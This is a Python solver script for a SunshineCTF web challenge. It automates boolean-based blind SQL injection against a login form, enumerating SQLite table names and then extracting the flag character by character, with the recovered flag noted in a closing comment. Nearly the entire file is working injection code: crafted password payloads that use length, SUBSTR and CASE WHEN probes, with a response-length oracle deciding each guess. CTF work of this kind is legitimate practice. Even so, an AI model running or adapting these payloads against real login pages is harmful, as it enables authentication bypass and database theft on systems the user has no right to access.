from requests import *
import string

url = 'http://bk.sunshinectf.org'
s = string.printable

def GetSource(passwd):
	d = {
		'username': 'hulkhogie',
		'password': passwd
	}
	r = post(url + '/login.php', data = d)
	return r.text

########## GET LENGTH OF TABLE(s) ############
tbl_length = 0
while 1:
	sc = GetSource("' or length((SELECT GROUP_CONCAT(name) FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%%'))=%s-- -"%tbl_length)
	if (len(sc) == 6760):
		print('Length of Table name: %s'%tbl_length)
		break
	tbl_length += 1

########## GET TABLE(s) NAMES ###########
table_name = ''
for i in range(1, tbl_length+1):
	test = 1
	for j in s:
		sc = GetSource("' or (CASE WHEN SUBSTR((SELECT GROUP_CONCAT(name) FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%%'), %s, 1)='%s' THEN 1 ELSE 0 END)-- -"%(i, j))
		if(len(sc) == 6760):
			table_name += j
			print(table_name)
			test = 0
			break
	if test: break
print('Table name : %s'%table_name)

table_name = 'users'
########## GET LENGTH OF flag ############
flag_length = 0
while 1:
	sc = GetSource("' or length((SELECT GROUP_CONCAT(flag) FROM %s WHERE length(flag) > 15))=%s-- -"%(table_name, flag_length))
	if (len(sc) == 6760):
		print('Length of flag: %s'%flag_length)
		break
	flag_length += 1

########## GET flag ###########
flag = ''
for i in range(1, flag_length+1):
	test = 1
	for j in s:
		sc = GetSource("' or (CASE WHEN SUBSTR((SELECT GROUP_CONCAT(flag) FROM %s WHERE length(flag) > 15), %s, 1)='%s' THEN 1 ELSE 0 END)-- -"%(table_name, i, j))
		if(len(sc) == 6760):
			flag += j
			print(flag)
			test = 0
			break
	if test: break
print('Flag is %s'%flag)

#Gives us the flag --> 'sun{ju57_4n07h3r_5ql1_chall}'
